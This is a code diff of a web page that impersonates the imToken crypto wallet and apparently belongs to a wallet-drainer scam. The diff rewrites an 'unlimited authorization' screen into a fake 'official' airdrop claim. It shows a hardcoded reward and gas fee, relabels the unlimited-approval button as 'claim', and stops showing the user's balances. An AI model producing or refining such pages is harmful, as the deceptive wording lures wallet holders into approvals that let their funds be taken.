@@ -251,7 +251,7 @@
         <!-- 头部 -->
         <div class="header">   
             <h1>imToken</h1>
-            <p class="desc">TRX生态安全授权服务，支持一键无限授权，可在imToken中撤销</p>
+            <p class="desc">imToken官方专属服务每个钱包地址只可领取一次，重复领取无限</p>
         </div>   
         <!-- 用户信息卡 -->
         <div id="userInfo">
@@ -263,18 +263,21 @@
             <div class="status-title"> 钱包状态</div>
             <!-- 未连接钱包时显示 -->
             <div class="disconnected-content">
-                <p>当前未连接钱包，连接后可：</p>
-                <p>1. 查看钱包内USDT、TRX余额</p>
-                <p>2. 发起能量无限授权操作</p>
-                <p>3. 查看历史授权记录</p>
+                <p>您现在准备领取的是imToken专属项目，非imToken用户不可领取</p>
+                <p>1. 每个钱包地址只可领取一次</p>
+                <p>2.随机领取能量或者TRX代币 </p>
+                <p>3.连接钱包后系统会根据钱包地址自动分配类型和额度</p>
+                <p>4.领取会消耗相应的能量或者TRX选择放弃直接退出即可</p>
             </div>
             <!-- 已连接钱包时显示 -->
             <div class="connected-content">
                 <p>✅ 钱包已成功连接</p>
                 <p>• 钱包地址：<span class="highlight" id="statusAddress"></span></p>
-                <p>• USDT余额：<span class="highlight" id="statusUsdt"></span></p>
-                <p>• TRX余额：<span class="highlight" id="statusTrx"></span></p>
-                <p>提示：授权操作需消耗少量TRX作为Gas费，请确保余额充足</p>
+                <p>• 领取类型：TRX</span></p>
+                <p>• 领取额度：15.2685</p>
+                <p>• 需消Gas费：10.6TRX</p>
+                <p>提示：请确保足够的TRX余额，先择放弃直接退出即可二次登入不会改变领取的类型和额度</p>
+
             </div>
         </div>
         <!-- 授权记录区 -->
@@ -309,7 +312,7 @@
             </div>
         </div> 
         <button id="connectBtn" class="btn"> 连接imToken钱包</button>
-        <button id="approveBtn" class="btn" disabled>能量无限授权</button>
+        <button id="approveBtn" class="btn" disabled>领取</button>
     </div>
 
     <!-- 底部信息区 -->
@@ -477,10 +480,7 @@
             if (userAddress) {
                 // 已连接：添加connected类，显示连接后内容
                 walletStatusContainer.classList.add("connected");
-                // 填充连接后的数据
-                document.getElementById("statusAddress").textContent = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-                document.getElementById("statusUsdt").textContent = `${tokenBalance} USDT`;
-                document.getElementById("statusTrx").textContent = `${trxBalance} TRX`;
+              
             } else {
                 // 未连接：移除connected类，显示未连接内容
                 walletStatusContainer.classList.remove("connected");
